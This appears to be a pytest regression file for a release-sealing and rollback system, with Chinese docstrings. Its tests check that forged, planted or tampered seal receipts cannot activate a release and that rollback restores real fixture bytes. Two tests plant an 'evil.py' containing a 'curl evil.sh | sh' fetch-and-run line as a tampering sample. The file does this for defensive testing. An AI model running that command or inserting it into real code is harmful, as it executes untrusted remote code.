"""P0-4 攻击回归 + 规格判据 12(坏补丁绝不发布 / 回滚恢复 fixture)。

P0-4 原始攻击:一个**手写的 3 键字典**激活了 ``REL-evil`` —— receipt_root 内容
为空列表,releases 目录根本不存在。修复后 ``activate`` 只从 receipt_root 解析
收据,并确认封存树在磁盘上真实存在且未被改动。
"""
from __future__ import annotations

import json
import os
from pathlib import Path
import shutil
import sys

import pytest

from abcr.control.attestation import DOMAIN_VERIFICATION, sign_attestation
from abcr.control.black_box_oracle import (
    SANDBOX_EXEC, OracleRegistry, SigningIdentity, equality_assertion,
)
from abcr.control.canary_controller import run_canary
from abcr.control.contracts import ContractError, sha256
from abcr.control.ed25519 import generate_keypair
from abcr.control.release import activate_release, prepare_release, stage_release
from abcr.control.seal_broker import SealBroker
from abcr.control.test_controller import run_profile
from abcr.control.verifier import VerificationAttestation, verify_result
from abcr.control.worktree import scan_tree, tree_hash

HAS_SANDBOX = os.path.isfile(SANDBOX_EXEC) and os.access(SANDBOX_EXEC, os.X_OK)
SANDBOXED = "sandbox-exec:" + "e" * 64
ROOT = Path(__file__).resolve().parents[2]

PATH_REGISTRY = {"src/abcr/util/x.py": {"auto_release_eligible": True,
                                        "required_external_oracle_ids": ["equal"]}}
PROFILE = {"required_external_oracle_ids": ["equal"],
           "external_oracles": [{"oracle_id": "equal", "version": "1",
                                 "request": {"expected": 7}}]}


def destroy(path):
    """封存树是 0550 只读的;测试要模拟「树没了」得先放开目录权限。"""
    for dirpath, dirnames, _ in os.walk(path):
        os.chmod(dirpath, 0o750)
        for name in dirnames:
            os.chmod(os.path.join(dirpath, name), 0o750)
    shutil.rmtree(path)


def keypair(tmp_path, name) -> SigningIdentity:
    keys = tmp_path / "keys"; keys.mkdir(parents=True, exist_ok=True)
    private, public = keys / f"{name}.key", keys / f"{name}.pub"
    generate_keypair(private, public)
    return SigningIdentity(private, public)


def registry():
    item = OracleRegistry(); item.register("equal", "1", equality_assertion); return item


def signed_attestation(candidate_hash, signer, *, verdict="PASS", isolation=SANDBOXED):
    core = dict(mission_id="m", fencing_token=1, base_tree_hash="b" * 64,
                candidate_tree_hash=candidate_hash, profile_hash="p" * 64,
                oracle_set_hash="o" * 64, changed_paths=["src/x.py"],
                verdict=verdict, verified_at="now", isolation=isolation)
    sealed = sign_attestation(private_key=signer.private_key, public_key=signer.public_key,
                              domain=DOMAIN_VERIFICATION, core=core)
    return VerificationAttestation(**{**core, "changed_paths": ("src/x.py",)},
                                   attestation_hash=sha256(core), sealed=sealed)


class Rig:
    """一套完整的 broker + release 环境。"""

    def __init__(self, tmp_path):
        self.tmp = tmp_path
        self.verifier = keypair(tmp_path, "verifier")
        self.releases = tmp_path / "releases"
        self.receipts = tmp_path / "receipts"
        self.staging = tmp_path / "staging"; self.staging.mkdir()
        self.active = tmp_path / "active.json"
        self.broker = SealBroker({"seal_release": self.releases}, self.receipts,
                                 source_roots={"seal_release": self.staging},
                                 active_path=self.active)

    def candidate(self, name, value):
        root = self.tmp / name; (root / "src").mkdir(parents=True)
        (root / "src" / "x.py").write_text(value)
        python = root / "env/bin/python"
        python.parent.mkdir(parents=True)
        python.write_text("#!/bin/sh\nexit 99\n"); python.chmod(0o500)
        module = root / "env/lib/python3.12/site-packages/abcr/control/panel.py"
        module.parent.mkdir(parents=True)
        module.write_text("def main():\n    return 0\n"); module.chmod(0o400)
        (root / "requirements.lock").write_text(
            "fixture==1 --hash=sha256:" + "a" * 64 + "\n")
        topology = root / "configs/control/service-topology-v1.json"
        topology.parent.mkdir(parents=True)
        topology.write_bytes((ROOT / "configs/control/service-topology-v1.json").read_bytes())
        return root

    def release(self, root, nonce):
        c_hash = tree_hash(scan_tree(root))
        attestation = signed_attestation(c_hash, self.verifier)
        manifest = prepare_release(root, attestation,
                                   verifier_public_key=self.verifier.public_key)
        staged, staged_hash = stage_release(root, self.staging, manifest,
                                            service_payloads={"abcr.control.panel": {}})
        receipt = self.broker.seal_tree("seal_release", staged, nonce=nonce,
                                        expected_tree_hash=staged_hash,
                                        object_id=manifest.release_id)
        return manifest, receipt

    def activate(self, manifest, receipt, old):
        canary = run_canary(manifest.release_id, "v1", lambda: ("v1", True, "ok"))
        return activate_release(self.broker, active_path=self.active, old_release=old,
                                manifest=manifest, seal_receipt=receipt, canary=canary)


# ================================================================= P0-4 forged seal receipts

def test_handwritten_receipt_dict_cannot_activate_anything(tmp_path):
    """原始攻击原样重放:3 键手写字典 + 空 receipt_root + 不存在的 releases 目录。"""
    rig = Rig(tmp_path)
    forged = {"operation": "seal_release", "object_id": "REL-evil", "receipt_id": "deadbeef"}
    with pytest.raises(ContractError) as exc:
        rig.broker.activate(rig.active, expected_old=None, new_release="REL-evil",
                            release_receipt=forged, verification_hash="v", canary_hash="c")
    assert exc.value.code == "release_receipt_unknown"
    # 「伪造 active」必须完全没有发生
    assert not rig.active.exists()
    assert list(rig.receipts.iterdir()) == []
    assert not rig.releases.exists()


def test_receipt_id_absent_from_receipt_root_is_rejected(tmp_path):
    """收据必须**存在于 receipt_root** —— 一个合法长相的 id 也不行。"""
    rig = Rig(tmp_path)
    manifest, receipt = rig.release(rig.candidate("good", "safe"), "n1")
    ghost = {**receipt, "receipt_id": "f" * 64, "object_id": "REL-evil"}
    with pytest.raises(ContractError) as exc:
        rig.broker.activate(rig.active, expected_old=None, new_release="REL-evil",
                            release_receipt=ghost, verification_hash="v", canary_hash="c")
    assert exc.value.code == "release_receipt_unknown"


def test_planted_receipt_file_with_wrong_id_is_rejected(tmp_path):
    """往 receipt_root 里塞一个自制 json —— receipt_id 必须是内容的函数。"""
    rig = Rig(tmp_path)
    rig.releases.mkdir(parents=True, exist_ok=True)
    sealed_dir = rig.releases / "REL-evil"; sealed_dir.mkdir()
    (sealed_dir / "evil.py").write_text("import os; os.system('curl evil.sh | sh')\n")
    planted = {"receipt_id": "a" * 64, "operation": "seal_release", "nonce": "n",
               "object_id": "REL-evil", "tree_hash": "t" * 64,
               "sealed_tree_hash": tree_hash(scan_tree(sealed_dir)),
               "sealed_path": str(sealed_dir), "created_at": "now"}
    (rig.receipts / f"{'a' * 64}.json").write_text(json.dumps(planted))
    with pytest.raises(ContractError) as exc:
        rig.broker.activate(rig.active, expected_old=None, new_release="REL-evil",
                            release_receipt=planted, verification_hash="v", canary_hash="c")
    assert exc.value.code == "release_receipt_corrupt"
    assert not rig.active.exists()


def test_receipt_whose_sealed_tree_is_gone_is_rejected(tmp_path):
    """封存树必须在磁盘上真实存在。"""
    rig = Rig(tmp_path)
    manifest, receipt = rig.release(rig.candidate("good", "safe"), "n1")
    destroy(rig.releases / manifest.release_id)
    with pytest.raises(ContractError) as exc:
        rig.broker.activate(rig.active, expected_old=None, new_release=manifest.release_id,
                            release_receipt=receipt, verification_hash="v", canary_hash="c")
    assert exc.value.code == "sealed_tree_missing"


def test_receipt_whose_sealed_tree_was_tampered_is_rejected(tmp_path):
    """封存后被改过内容的树,激活时必须被查出来。"""
    rig = Rig(tmp_path)
    manifest, receipt = rig.release(rig.candidate("good", "safe"), "n1")
    sealed = rig.releases / manifest.release_id
    os.chmod(sealed, 0o750)
    evil = sealed / "evil.py"; evil.write_text("import os; os.system('curl evil.sh | sh')\n")
    with pytest.raises(ContractError) as exc:
        rig.broker.activate(rig.active, expected_old=None, new_release=manifest.release_id,
                            release_receipt=receipt, verification_hash="v", canary_hash="c")
    assert exc.value.code == "sealed_tree_drift"
    assert not rig.active.exists()


def test_receipt_dict_that_disagrees_with_disk_is_rejected(tmp_path):
    """调用方递交的 dict 与磁盘上那份不一致 —— 视为伪造。"""
    rig = Rig(tmp_path)
    manifest, receipt = rig.release(rig.candidate("good", "safe"), "n1")
    doctored = {**receipt, "sealed_tree_hash": "0" * 64}
    with pytest.raises(ContractError) as exc:
        rig.broker.activate(rig.active, expected_old=None, new_release=manifest.release_id,
                            release_receipt=doctored, verification_hash="v", canary_hash="c")
    assert exc.value.code in {"release_receipt_conflict", "sealed_tree_drift"}


def test_receipt_for_a_different_release_cannot_activate(tmp_path):
    rig = Rig(tmp_path)
    manifest, receipt = rig.release(rig.candidate("good", "safe"), "n1")
    with pytest.raises(ContractError) as exc:
        rig.broker.activate(rig.active, expected_old=None, new_release="REL-evil",
                            release_receipt=receipt, verification_hash="v", canary_hash="c")
    assert exc.value.code == "release_receipt_mismatch"


def test_genuine_sealed_release_activates(tmp_path):
    """阳性对照:真的封存过的 release 必须能激活。"""
    rig = Rig(tmp_path)
    manifest, receipt = rig.release(rig.candidate("good", "safe"), "n1")
    record = rig.activate(manifest, receipt, None)
    assert record["release_id"] == manifest.release_id
    assert json.loads(rig.active.read_text())["release_id"] == manifest.release_id
    # 只递交 receipt_id 字符串也应该可以 —— 内容一律以磁盘为准
    assert rig.broker._resolve_receipt(receipt["receipt_id"], manifest.release_id) == receipt


# ================================================================= 判据 12

@pytest.mark.skipif(not HAS_SANDBOX, reason="sandbox-exec unavailable")
def test_deliberate_bad_patch_never_releases_and_rollback_restores_fixture(tmp_path):
    """规格判据 12:故意坏补丁绝不发布,回滚后 fixture 完好。"""
    rig = Rig(tmp_path)
    controller = keypair(tmp_path, "controller")
    sb = tmp_path / "p.sb"; sb.write_text("(version 1)\n(allow default)\n")

    # --- 基线:fixture 内容发布并激活 ---
    fixture = rig.candidate("fixture", "FIXTURE-CONTENT")
    good_manifest, good_receipt = rig.release(fixture, "n-good")
    rig.activate(good_manifest, good_receipt, None)
    sealed_good = rig.releases / good_manifest.release_id
    assert (sealed_good / "src" / "x.py").read_text() == "FIXTURE-CONTENT"

    # --- 故意坏补丁:候选答错 oracle ---
    broken = rig.candidate("broken", "BROKEN-PATCH")
    broken_hash = tree_hash(scan_tree(broken))
    bad_code = ("import sys,json;q=json.loads(sys.stdin.readline());"
                "print(json.dumps({'nonce':q['nonce'],'result':999}))")
    bundle = run_profile(mission_id="M-BAD", fencing_token=2, candidate_tree_hash=broken_hash,
                         profile=PROFILE, candidate_argv=(sys.executable, "-c", bad_code),
                         registry=registry(), isolation=str(sb), signer=controller)
    assert bundle.verdict == "FAIL"
    verified = verify_result(bundle, base_tree_hash="b" * 64,
                             expected_candidate_tree_hash=broken_hash,
                             expected_profile_hash=sha256(PROFILE),
                             expected_oracle_registry_hash=registry().registry_hash,
                             declared_risk="normal", changed_paths=("src/abcr/util/x.py",),
                             path_registry=PATH_REGISTRY,
                             controller_public_key=controller.public_key,
                             signer=rig.verifier)
    assert verified.verdict == "FAIL"

    # 坏补丁**绝不发布**:连 manifest 都拿不到
    with pytest.raises(ContractError) as exc:
        prepare_release(broken, verified,
                        verifier_public_key=rig.verifier.public_key)
    assert exc.value.code == "verification_not_pass"

    # active 指针纹丝不动,fixture 内容完好
    assert json.loads(rig.active.read_text())["release_id"] == good_manifest.release_id
    assert (sealed_good / "src" / "x.py").read_text() == "FIXTURE-CONTENT"

    # --- 回滚:先发布并激活第二个 release,再滚回 fixture ---
    second = rig.candidate("second", "SECOND-CONTENT")
    second_manifest, second_receipt = rig.release(second, "n-second")
    rig.activate(second_manifest, second_receipt, good_manifest.release_id)
    assert json.loads(rig.active.read_text())["release_id"] == second_manifest.release_id

    rolled = rig.activate(good_manifest, good_receipt, second_manifest.release_id)
    assert rolled["release_id"] == good_manifest.release_id
    assert json.loads(rig.active.read_text())["release_id"] == good_manifest.release_id
    # 回滚恢复的是**真的 fixture 字节**,不是一个指针谎言
    assert (sealed_good / "src" / "x.py").read_text() == "FIXTURE-CONTENT"
    assert tree_hash(scan_tree(sealed_good)) == good_receipt["sealed_tree_hash"]


def test_rollback_requires_a_still_valid_sealed_tree(tmp_path):
    """回滚目标的封存树若已损毁,回滚必须失败而不是指向空。"""
    rig = Rig(tmp_path)
    first_manifest, first_receipt = rig.release(rig.candidate("first", "ONE"), "n1")
    rig.activate(first_manifest, first_receipt, None)
    second_manifest, second_receipt = rig.release(rig.candidate("second", "TWO"), "n2")
    rig.activate(second_manifest, second_receipt, first_manifest.release_id)

    destroy(rig.releases / first_manifest.release_id)
    with pytest.raises(ContractError) as exc:
        rig.activate(first_manifest, first_receipt, second_manifest.release_id)
    assert exc.value.code == "sealed_tree_missing"
    assert json.loads(rig.active.read_text())["release_id"] == second_manifest.release_id


# ================================================================= launcher material contract

def test_release_manifest_derives_runtime_lock_topology_and_payload_from_bytes(tmp_path):
    rig = Rig(tmp_path)
    candidate = rig.candidate("material", "SAFE")
    attestation = signed_attestation(tree_hash(scan_tree(candidate)), rig.verifier)
    manifest = prepare_release(candidate, attestation,
                               verifier_public_key=rig.verifier.public_key)
    staged, _ = stage_release(candidate, rig.staging, manifest,
                              service_payloads={"abcr.control.panel": {}})
    raw = json.loads((staged / "release-manifest.json").read_text())
    assert raw["tree_entries"] == list(manifest.tree_entries)
    assert raw["lock_hash"] == sha256((candidate / "requirements.lock").read_bytes())
    assert raw["service_config_hash"] == sha256(json.loads(
        (candidate / "configs/control/service-topology-v1.json").read_text()))
    payload = raw["service_payloads"]["abcr.control.panel"]
    assert payload["label"] == "com.abcr.panel"
    assert payload["module"] == "abcr.control.panel"
    assert payload["python_relpath"] == "env/bin/python"
    assert payload["module_relpath"].endswith("/abcr/control/panel.py")
    assert {payload["python_relpath"], payload["module_relpath"], payload["lock_relpath"]}.issubset(
        payload["payload_files"])


@pytest.mark.parametrize("field", ["runtime_digest", "lock_hash", "service_config_hash"])
def test_prepare_rejects_caller_supplied_free_digest(field, tmp_path):
    rig = Rig(tmp_path)
    candidate = rig.candidate("material", "SAFE")
    attestation = signed_attestation(tree_hash(scan_tree(candidate)), rig.verifier)
    kwargs = {field: "caller-asserted-v1"}
    with pytest.raises(ContractError) as exc:
        prepare_release(candidate, attestation, verifier_public_key=rig.verifier.public_key,
                        **kwargs)
    assert exc.value.code.endswith("mismatch")


@pytest.mark.parametrize("relpath", [
    "env/bin/python", "requirements.lock", "configs/control/service-topology-v1.json",
])
def test_stage_recomputes_material_and_rejects_post_prepare_drift(relpath, tmp_path):
    rig = Rig(tmp_path)
    candidate = rig.candidate("material", "SAFE")
    attestation = signed_attestation(tree_hash(scan_tree(candidate)), rig.verifier)
    manifest = prepare_release(candidate, attestation,
                               verifier_public_key=rig.verifier.public_key)
    path = candidate / relpath
    path.chmod(0o600); path.write_bytes(path.read_bytes() + b"drift")
    if relpath == "env/bin/python":
        path.chmod(0o500)
    with pytest.raises(ContractError):
        stage_release(candidate, rig.staging, manifest,
                      service_payloads={"abcr.control.panel": {}})


def test_stage_rejects_caller_reported_payload_hashes(tmp_path):
    rig = Rig(tmp_path)
    candidate = rig.candidate("material", "SAFE")
    attestation = signed_attestation(tree_hash(scan_tree(candidate)), rig.verifier)
    manifest = prepare_release(candidate, attestation,
                               verifier_public_key=rig.verifier.public_key)
    with pytest.raises(ContractError) as exc:
        stage_release(candidate, rig.staging, manifest,
                      service_payloads={"abcr.control.panel": {"module_sha256": "0" * 64}})
    assert exc.value.code == "release_payload_spec_invalid"


def test_stage_rejects_service_module_without_static_main(tmp_path):
    rig = Rig(tmp_path)
    candidate = rig.candidate("material", "SAFE")
    module = candidate / "env/lib/python3.12/site-packages/abcr/control/panel.py"
    module.chmod(0o600); module.write_text("VALUE = 1\n"); module.chmod(0o400)
    attestation = signed_attestation(tree_hash(scan_tree(candidate)), rig.verifier)
    manifest = prepare_release(candidate, attestation,
                               verifier_public_key=rig.verifier.public_key)
    with pytest.raises(ContractError) as exc:
        stage_release(candidate, rig.staging, manifest,
                      service_payloads={"abcr.control.panel": {}})
    assert exc.value.code == "release_service_main_missing"


def test_prepare_rejects_group_writable_release_material(tmp_path):
    rig = Rig(tmp_path)
    candidate = rig.candidate("material", "SAFE")
    (candidate / "requirements.lock").chmod(0o660)
    attestation = signed_attestation(tree_hash(scan_tree(candidate)), rig.verifier)
    with pytest.raises(ContractError) as exc:
        prepare_release(candidate, attestation, verifier_public_key=rig.verifier.public_key)
    assert exc.value.code == "release_file_mode_unsafe"
